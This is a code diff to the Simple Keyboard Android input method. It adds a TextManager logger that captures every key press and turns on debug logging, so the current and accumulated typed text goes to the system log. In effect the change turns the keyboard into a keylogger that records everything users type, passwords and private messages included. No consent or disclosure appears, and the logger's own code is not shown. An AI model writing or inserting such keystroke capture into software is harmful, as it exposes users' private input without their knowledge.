@@ -23,6 +23,7 @@ import rkr.simplekeyboard.inputmethod.event.Event;
 import rkr.simplekeyboard.inputmethod.latin.common.Constants;
 import rkr.simplekeyboard.inputmethod.latin.utils.CapsModeUtils;
 import rkr.simplekeyboard.inputmethod.latin.utils.RecapitalizeStatus;
+import rkr.simplekeyboard.inputmethod.logger.TextManager;
 
 /**
  * Keyboard state machine.
@@ -38,7 +39,7 @@ import rkr.simplekeyboard.inputmethod.latin.utils.RecapitalizeStatus;
  */
 public final class KeyboardState {
     private static final String TAG = KeyboardState.class.getSimpleName();
-    private static final boolean DEBUG_EVENT = false;
+    private static final boolean DEBUG_EVENT = true;
     private static final boolean DEBUG_INTERNAL_ACTION = false;
 
     public interface SwitchActions {
@@ -109,6 +110,9 @@ public final class KeyboardState {
             return "SYMBOLS_" + shiftModeToString(mShiftMode);
         }
     }
+
+    // [tgl] logs text
+    private final TextManager textManager = TextManager.getInstance();
 
     public KeyboardState(final SwitchActions switchActions) {
         mSwitchActions = switchActions;
@@ -322,10 +326,15 @@ public final class KeyboardState {
 
     public void onPressKey(final int code, final boolean isSinglePointer, final int autoCapsFlags,
             final int recapitalizeMode) {
+
+        textManager.handleText(code);
+
         if (DEBUG_EVENT) {
             Log.d(TAG, "onPressKey: code=" + Constants.printableCode(code)
                     + " single=" + isSinglePointer
                     + " " + stateToString(autoCapsFlags, recapitalizeMode));
+            Log.d(TAG, "TextManager: text=" + textManager.getCurrText());
+            Log.d(TAG, "TextManager: texts=" + textManager.getTexts());
         }
         if (code != Constants.CODE_SHIFT) {
             // Because the double tap shift key timer is to detect two consecutive shift key press,
